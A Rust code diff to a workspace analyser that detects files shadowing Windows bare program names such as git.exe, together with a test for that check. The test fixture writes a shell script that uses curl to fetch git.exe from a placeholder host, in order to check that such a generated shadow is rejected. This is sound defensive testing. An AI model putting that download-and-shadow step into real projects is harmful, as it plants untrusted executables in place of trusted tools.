@@ -108,6 +108,7 @@ fn close_over_execution_inputs(
 ) -> Result<()> {
     let mut validated = surfaces.clone();
     let mut pending = surfaces.iter().cloned().collect::<Vec<_>>();
+    let mut windows_bare_programs = BTreeSet::new();
     while let Some(surface) = pending.pop() {
         let source = fs::read_to_string(workspace.join(&surface)).with_context(|| format!("read command execution surface {surface}"))?;
         let source_is_reviewed = command_profiles.is_some_and(|profiles| profiles.source_is_current(&surface, &source));
@@ -122,6 +123,7 @@ fn close_over_execution_inputs(
             &reviewed_source,
             source_is_reviewed,
         );
+        windows_bare_programs.extend(execution_inputs.windows_bare_programs.iter().cloned());
         let mut referenced_inputs = execution_inputs.paths;
         referenced_inputs.extend(windows_bare_program_shadows(&execution_inputs.windows_bare_programs, checked_paths));
         if execution_inputs.unresolved {
@@ -148,9 +150,11 @@ fn close_over_execution_inputs(
             }
         }
     }
+    let mut protected_surfaces = surfaces.clone();
+    protected_surfaces.extend(windows_bare_program_candidates(&windows_bare_programs));
     let analyzer = WorkspaceAnalyzer::new(WorkspaceContext {
         root: workspace,
-        execution_surfaces: surfaces,
+        execution_surfaces: &protected_surfaces,
         tracked_paths,
     });
     for surface in surfaces.iter() {
@@ -199,15 +203,19 @@ fn is_rust_source(path: &str) -> bool {
 }
 
 fn windows_bare_program_shadows(programs: &BTreeSet<String>, checked_paths: &BTreeSet<String>) -> BTreeSet<String> {
-    const WINDOWS_EXECUTABLE_SUFFIXES: &[&str] = &["", ".exe", ".com", ".bat", ".cmd"];
-    let candidates = programs
-        .iter()
-        .flat_map(|program| WINDOWS_EXECUTABLE_SUFFIXES.iter().map(move |suffix| format!("{program}{suffix}")))
-        .collect::<BTreeSet<_>>();
+    let candidates = windows_bare_program_candidates(programs);
     checked_paths
         .iter()
         .filter(|path| !path.contains('/') && candidates.contains(&path.to_ascii_lowercase()))
         .cloned()
+        .collect()
+}
+
+fn windows_bare_program_candidates(programs: &BTreeSet<String>) -> BTreeSet<String> {
+    const WINDOWS_EXECUTABLE_SUFFIXES: &[&str] = &["", ".exe", ".com", ".bat", ".cmd"];
+    programs
+        .iter()
+        .flat_map(|program| WINDOWS_EXECUTABLE_SUFFIXES.iter().map(move |suffix| format!("{program}{suffix}")))
         .collect()
 }
 
@@ -670,6 +678,15 @@ mod tests {
         .expect("write Python command surface");
         git(repository.path(), &["init", "--quiet"]);
         git(repository.path(), &["add", "."]);
+        fs::write(
+            repository.path().join("script/run.sh"),
+            "#!/bin/sh\ncurl -o git.exe https://example.invalid/git.exe\npython script/check.py\n",
+        )
+        .expect("write generator");
+        git(repository.path(), &["add", "script/run.sh"]);
+        let error = execution_surfaces(repository.path()).err().expect("reject generated Windows shadow");
+        assert!(error.to_string().contains("opaque interpreter program"), "{error:#}");
+        fs::remove_file(repository.path().join("script/run.sh")).expect("remove generator");
         fs::write(repository.path().join("GIT.EXE"), "opaque\n").expect("write untracked Windows shadow");
 
         let error = execution_surfaces(repository.path()).err().expect("reject untracked Windows shadow");
